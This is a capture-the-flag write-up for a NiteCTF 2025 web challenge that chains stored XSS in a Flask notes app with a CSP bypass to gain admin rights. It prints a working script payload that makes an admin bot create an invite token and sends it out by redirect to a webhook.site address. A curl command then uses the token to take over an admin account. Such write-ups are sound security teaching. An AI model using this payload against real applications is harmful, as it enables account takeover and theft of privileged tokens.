# Just Another Notes App / \ Web Security

- CTF: NiteCTF 2025
- Category: Web
- Author: -
- Solver: .M4K5
- Flag: `nite{r3qu3575_d0n7_n33d_70_4lw4y5_c0mpl373}`

---

## Challenge
> "A Flask-based notes application with an admin bot that visits user-submitted URLs. The challenge involves chaining XSS with privilege escalation to obtain the flag stored in an HttpOnly cookie."

The application allows users to create notes but fails to sanitize input, leading to Stored XSS. The goal is to bypass CSP and escalate privileges to Admin to steal the flag.

---

## Overview
The application has three main components:
- **Notes App:** Allows creating and viewing notes. Vulnerable to XSS.
- **Admin Bot:** Visits reported URLs. Holds the flag in an HttpOnly cookie.
- **Invite System:** An admin-only feature to generate invite codes (`/admin/generate_invite`) and retrieve them (`/getToken`).

Security measures in place:
- **CSP:** `script-src 'self' 'unsafe-inline'; connect-src 'self';`. This blocks `fetch` to external domains but allows inline scripts and same-origin fetch.
- **HttpOnly Cookies:** Prevents accessing `document.cookie` via JavaScript.

---

## Root Cause
- **Stored XSS:** No input sanitization on notes allows injecting `<script>`.
- **CSP Bypass:** The CSP allows communicating with `self` (the app itself) and does not block top-level navigations (`location.href`).
- **Privilege Escalation:** An attacker can use XSS to make the Admin Bot generate an invite code and then exfiltrate that code to an external server via a redirect.
- **Account Takeover:** Using the exfiltrated invite code, the attacker can promote their own account to Admin and view the flag.

---

## Exploitation Steps
1. **Create Malicious Note:** create a note containing the XSS payload.
   ```html
   <script>
   // 1. Ask admin to generate a new invite
   fetch("/admin/generate_invite", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: "{}"
   })
   .then(r => r.json())
   .then(d => {
       // 2. Retrieve the generated token
       fetch("/getToken")
       .then(r => {
           // 3. Exfiltrate the token via redirect (bypassing CSP connect-src)
           location = "https://webhook.site/YOUR-ID?token=" + encodeURIComponent(r.url);
       });
   });
   </script>
   ```
2. **Submit to Admin Bot:** Send the URL of the malicious note to the admin bot (requires solving a PoW).
3. **Receive Token:** Check your webhook for the incoming request containing the invite token.
4. **Accept Invite:** Use the token to upgrade your user account to Admin.
   ```bash
   curl -X POST -d "token=YOUR_TOKEN" https://notes.chals.nitectf25.live/accept_invite -b cookies.txt
   ```
5. **Get Flag:** Visit `/admin` with your new admin privileges.
